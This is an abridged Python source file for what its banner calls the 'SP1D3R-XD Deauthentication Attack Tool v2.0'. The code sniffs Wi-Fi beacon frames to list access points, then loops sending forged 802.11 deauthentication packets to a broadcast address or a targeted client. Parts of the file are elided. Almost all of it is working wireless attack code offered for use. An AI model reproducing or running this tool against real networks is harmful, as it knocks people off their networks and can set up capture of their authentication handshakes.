...
class SP1D3RXD:
    ...
    def banner(self):
        print(f"""
{Fore.RED}🕷️  SP1D3R-XD {Fore.YELLOW}DEAUTHENTICATION {Fore.RED}ATTACK TOOL v2.0  🕷️
{Fore.CYAN}╔══════════════════════════════════════════════════════╗
...
{Fore.CYAN}╚══════════════════════════════════════════════════════╝{Style.RESET_ALL}
        ...
        def packet_handler(pkt):
            if pkt.haslayer(Dot11Beacon):
                ...
                if ssid and bssid not in self.found_aps:
                    ...
                    channel = pkt[Dot11Elt:3].channel if pkt.haslayer(Dot11Elt:3) else "?"
        ...
        def send_loop():
            ...
            while self.attack_running and (packets == 0 or sent < packets):
                if direction in ["ap", "both"]:
                    sendp(self.deauth_packet(bssid, "ff:ff:ff:ff:ff:ff"), iface=iface, verbose=0, inter=rate)
                if direction in ["client", "both"]:
                    sendp(self.deauth_packet(bssid, client), iface=iface, verbose=0, inter=rate)
    ...
    def run_attack(self, iface, bssid=None, client=None, packets=0, rate=0.05, channel=None, capture=False):
    ...
    def menu(self):
        ...
        self.run_attack(iface, args.bssid, args.client, args.packets, args.rate, args.channel, args.capture)
